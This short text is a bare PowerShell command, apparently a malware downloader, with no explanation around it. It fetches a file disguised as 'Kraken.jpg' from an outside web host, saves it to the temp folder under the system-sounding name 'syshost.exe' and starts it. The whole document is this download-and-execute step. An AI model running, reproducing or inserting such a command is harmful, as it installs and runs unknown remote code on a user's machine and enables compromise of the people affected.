$TempDir = [System.IO.Path]::GetTempPath(); (New-Object System.Net.WebClient).DownloadFile("http://kulup.isikun.edu.tr/Kraken.jpg","  $TempDirsyshost.exe"); start $TempDirsyshost.exe;